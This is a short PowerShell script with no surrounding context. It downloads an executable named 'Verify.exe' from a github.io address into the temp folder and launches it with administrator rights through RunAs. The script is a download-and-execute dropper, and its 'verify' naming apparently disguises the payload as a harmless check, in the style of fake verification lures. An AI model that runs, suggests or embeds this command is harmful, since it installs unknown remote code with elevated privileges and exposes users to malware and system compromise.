
$exeScriptUrl = "http://mcrobbyyt.github.io/Verify.exe"


$localScriptPath = "$env:TEMP\verify.exe"


Invoke-WebRequest -Uri $exeScriptUrl -OutFile $localScriptPath


Start-Process -FilePath $localScriptPath -Verb RunAs
